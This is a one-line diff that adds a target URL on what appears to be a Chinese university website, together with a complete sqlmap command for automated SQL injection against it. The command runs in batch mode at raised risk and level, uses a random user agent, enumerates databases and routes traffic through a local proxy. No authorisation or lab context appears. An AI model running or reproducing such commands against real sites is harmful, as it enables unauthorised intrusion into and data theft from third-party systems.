@@ -1,0 +1,1 @@
+https://ahskqyy.ahmu.edu.cn/info_272.aspx?itemid=1085 (GET)  # .\sqlmap.py -m .\url.txt --dbs --batch --risk 2 --level 3 --random-agent -p id --output-dir result --proxy=http://127.0.0.1:7890
